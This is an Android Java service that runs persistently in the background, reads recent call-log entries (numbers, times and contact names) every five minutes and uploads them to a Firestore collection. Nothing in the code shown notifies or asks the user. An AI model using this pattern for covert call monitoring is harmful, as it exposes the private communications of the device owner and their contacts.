package com.example.callcheckout;
import android.Manifest;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.provider.CallLog;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.ActivityCompat;

import com.google.firebase.firestore.FirebaseFirestore;

import java.util.Date;
import java.util.HashMap;
import java.util.Map;

public class CallLogService extends Service {

    private static final String TAG = "CallLogService";
    private static final String COLLECTION_NAME = "callhistory";
    private static final long INTERVAL = 5 * 60 * 1000; // check for new call logs every 5 minutes
    private static final String[] CALL_LOG_PROJECTION = {
            CallLog.Calls.NUMBER,
            CallLog.Calls.DATE,
            CallLog.Calls.CACHED_NAME
    };
    private static final int CALL_LOG_NUMBER_INDEX = 0;
    private static final int CALL_LOG_DATE_INDEX = 1;
    private static final int CALL_LOG_NAME_INDEX = 2;

    private Handler handler = new Handler();
    private FirebaseFirestore firestore;

    private Runnable runnable = new Runnable() {
        @Override
        public void run() {
            // check if the app has permission to read call log
            if (ActivityCompat.checkSelfPermission(CallLogService.this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
                Log.w(TAG, "No permission to read call log");
                return;
            }

            // query the call log for new entries
            ContentResolver contentResolver = getContentResolver();
            Uri callLogUri = CallLog.Calls.CONTENT_URI;
            String selection = CallLog.Calls.DATE + " > ?";
            String[] selectionArgs = {String.valueOf(new Date().getTime() - INTERVAL)};
            Cursor cursor = contentResolver.query(callLogUri, CALL_LOG_PROJECTION, selection, selectionArgs, null);
            if (cursor == null) {
                Log.w(TAG, "Failed to query call log");
                return;
            }

            // iterate over the cursor and extract call log data
            while (cursor.moveToNext()) {
                String number = cursor.getString(CALL_LOG_NUMBER_INDEX);
                long dateMillis = cursor.getLong(CALL_LOG_DATE_INDEX);
                String name = cursor.getString(CALL_LOG_NAME_INDEX);
                Date date = new Date(dateMillis);

                // create a CallLogItem object and send it to Firestore
                CallLogItem callLogItem = new CallLogItem(number, name, date);
                sendCallLog(callLogItem);
            }
            cursor.close();

            // schedule next check
            handler.postDelayed(this, INTERVAL);
        }
    };

    @Override
    public void onCreate() {
        super.onCreate();
        firestore = FirebaseFirestore.getInstance();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "CallLogService started");

        // start checking for new call logs
        handler.post(runnable);

        // make the service sticky
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();

        Log.d(TAG, "CallLogService stopped");

        // stop checking for new call logs
        handler.removeCallbacks(runnable);
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void sendCallLog(CallLogItem callLogItem) {
        // create a map containing the call log data
        Map<String, Object> callLogMap = new HashMap<>();
        callLogMap.put("number", callLogItem.getNumber());
        callLogMap.put("date", callLogItem.getDate());
        callLogMap.put("login", callLogItem.getName());
        ;

        // add the call log to Firestore
        firestore.collection(COLLECTION_NAME)
                .add(callLogMap)
                .addOnSuccessListener(documentReference -> {
                    Log.d(TAG, "Call log added to Firestore: " + documentReference.getId());
                })
                .addOnFailureListener(e -> {
                    Log.w(TAG, "Failed to add call log to Firestore", e);
                });
    }
    public class CallLogItem {
        private String number;
        private String name;
        private Date date;

        public CallLogItem(String number, String name, Date date) {
            this.number = number;
            this.name = name;
            this.date = date;
        }

        public String getNumber() {
            return number;
        }

        public String getName() {
            return name;
        }

        public Date getDate() {
            return date;
        }
    }

}
